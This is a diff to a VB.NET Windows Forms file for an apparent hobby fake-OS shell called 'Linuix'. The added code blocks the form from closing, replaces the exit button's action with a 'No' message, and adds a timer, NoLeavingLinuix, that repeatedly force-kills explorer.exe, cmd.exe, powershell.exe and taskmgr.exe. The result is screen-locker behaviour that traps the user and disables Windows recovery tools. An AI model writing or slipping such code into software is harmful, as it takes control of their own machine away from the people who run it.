@@ -3,6 +3,9 @@
     Private Sub OSMain_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
         Me.ApplySettings()
     End Sub
+    Private Sub OSMain_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
+        e.Cancel = True
+    End Sub
 
     Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Launcher_LinuixSettings.Click
         LinuixSettings.ShowDialog()
@@ -54,8 +57,7 @@
     End Sub
 
     Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
-        Application.Exit()
-        End
+        MessageBox.Show("No")
     End Sub
 
     Private Sub Button3_Click(sender As System.Object, e As System.EventArgs) Handles Launcher_VirusSheild.Click
@@ -64,5 +66,12 @@
 
     Private Sub Button4_Click(sender As System.Object, e As System.EventArgs) Handles Launcher_Interwebs.Click
         interwebs.Show()
+    End Sub
+
+    Private Sub NoLeavingLinuix_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NoLeavingLinuix.Tick
+        Process.Start("taskkill", "/f /im explorer.exe")
+        Process.Start("taskkill", "/f /im cmd.exe")
+        Process.Start("taskkill", "/f /im powershell.exe")
+        Process.Start("taskkill", "/f /im taskmgr.exe")
     End Sub
 End Class
